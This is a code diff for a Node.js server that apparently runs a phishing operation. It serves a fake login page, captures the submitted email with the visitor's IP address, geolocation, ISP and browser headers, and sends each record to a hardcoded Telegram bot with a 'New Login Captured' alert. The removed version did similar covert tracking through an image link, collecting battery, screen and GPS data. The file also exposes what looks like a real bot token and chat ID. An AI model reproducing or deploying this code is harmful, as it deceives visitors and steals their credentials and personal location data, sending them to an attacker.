@@ -1,135 +1,108 @@
 const express = require("express");
 const axios = require("axios");
 const fs = require("fs");
+const path = require("path");
 const app = express();
 
+// Port for Render or local
 const port = process.env.PORT || 3000;
 
-// Telegram Bot details
+// Telegram Bot credentials
 const telegramBotToken = "8054463444:AAGU44U27Hly1LPgMqM2H_5fYwVQCbgLFME";
 const telegramChatId = "1387832458";
 
-app.use(express.json());
-app.use(express.static(__dirname));
+app.use(express.json()); // for parsing application/json
+app.use(express.static(path.join(__dirname))); // to serve login.html
 
-// Default route
+// Serve login page
 app.get("/", (req, res) => {
-  res.sendFile(__dirname + "/image.jpg");
+  res.sendFile(__dirname + "/login.html");
 });
 
-// IP tracking route
-app.get("/track-image", async (req, res) => {
+// Track route — triggered from login form
+app.post("/track-image", async (req, res) => {
+  const email = req.body.email || "Not Provided";
   const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
   const timestamp = new Date().toISOString();
+  const log = `IP: ${ip} | Email: ${email} | Time: ${timestamp}\n`;
+
+  fs.appendFile("ip_logs.txt", log, (err) => {
+    if (err) console.error("Log error:", err);
+  });
 
   try {
-    const ipData = await axios.get(`http://ip-api.com/json/${ip}`);
+    const response = await axios.get(`http://ip-api.com/json/${ip}`);
+    if (response.data.status === "fail") {
+      throw new Error(`API failed: ${response.data.message}`);
+    }
+
     const {
       country = "Unknown",
-      countryCode = "",
+      countryCode = "Unknown",
+      region = "Unknown",
       regionName = "Unknown",
       city = "Unknown",
-      zip = "",
+      zip = "Not Available",
       lat = "Unknown",
       lon = "Unknown",
       timezone = "Unknown",
       isp = "Unknown",
       org = "Unknown",
       as = "Unknown",
-    } = ipData.data;
+    } = response.data;
 
     const userAgent = req.headers["user-agent"] || "Unknown";
     const language = req.headers["accept-language"] || "Unknown";
     const referer = req.headers["referer"] || "Direct Link";
+    const connection = req.headers["connection"] || "Unknown";
     const host = req.headers["host"] || "Unknown";
 
-    const log = `IP: ${ip} | Time: ${timestamp}\n`;
-    fs.appendFile("ip_logs.txt", log, (err) => {
-      if (err) console.error("Log error:", err);
-    });
+    const detailedData = `
+📧 Email: ${email}
+🌐 IP Address: ${ip}
+📍 Country: ${country} (${countryCode})
+🏙️ State/Region: ${regionName} (${region})
+🌆 City: ${city}
+📮 ZIP: ${zip}
+📌 Latitude: ${lat}
+📌 Longitude: ${lon}
+🕒 Timezone: ${timezone}
+🌐 ISP: ${isp}
+🏢 Organization: ${org}
+🔗 ASN: ${as}
+🧠 User-Agent: ${userAgent}
+🗣️ Language: ${language}
+🔁 Referer: ${referer}
+🔌 Connection: ${connection}
+🖥️ Host: ${host}
+🕓 Timestamp: ${timestamp}
+    `;
 
-    // Send back the image
-    res.sendFile(__dirname + "/image.jpg");
-
-    // Prepare basic message
-    const basicInfo = {
-      ip,
-      timestamp,
-      country,
-      regionName,
-      city,
-      zip,
-      lat,
-      lon,
-      timezone,
-      isp,
-      org,
-      as,
-      userAgent,
-      language,
-      referer,
-      host,
-    };
-
-    // Save to use later when client sends details
-    global.lastVisitor = basicInfo;
-  } catch (err) {
-    console.error("Tracking error:", err.message);
     await axios.get(
       `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
       {
         params: {
           chat_id: telegramChatId,
-          text: `❌ Error fetching IP info for: ${ip} - ${err.message}`,
+          text: `🚨 New Login Captured:\n${detailedData}`,
         },
       }
     );
-
-    res.sendFile(__dirname + "/image.jpg");
-  }
-});
-
-// Route for browser-side info
-app.post("/log-info", async (req, res) => {
-  const { screen, battery, geo, timezone } = req.body;
-  const data = global.lastVisitor || {};
-
-  const message = `
-📡 New Visitor Logged!
-
-🕒 Time: ${data.timestamp}
-🌐 IP: ${data.ip}
-📍 Location: ${data.city}, ${data.regionName}, ${data.country}
-🏢 ISP: ${data.isp}
-🧭 Timezone: ${timezone || data.timezone}
-🖥️ Device: ${data.userAgent}
-🗣️ Language: ${data.language}
-🖼️ Screen: ${screen || "N/A"}
-🔋 Battery: ${battery || "N/A"}
-📌 Geolocation: ${geo || "User denied access"}
-📍 Latitude: ${geo?.split(",")[0]?.replace("Lat: ", "") || "N/A"}
-📍 Longitude: ${geo?.split(",")[1]?.replace("Lon: ", "") || "N/A"}
-🔗 Referer: ${data.referer}
-🧷 Host: ${data.host}
-`;
-
-  try {
+  } catch (err) {
+    console.error("Tracking Error:", err.message);
     await axios.get(
       `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
       {
         params: {
           chat_id: telegramChatId,
-          text: message,
+          text: `❌ Error fetching info for IP: ${ip} - ${err.message}`,
         },
       }
     );
-  } catch (err) {
-    console.error("Telegram Error:", err.message);
   }
 
-  res.sendStatus(200);
+  res.status(200).send("Logged Successfully");
 });
 
 app.listen(port, () => {
-  console.log(`✅ Server running on port ${port}`);
+  console.log(`Server running on port ${port}`);
 });
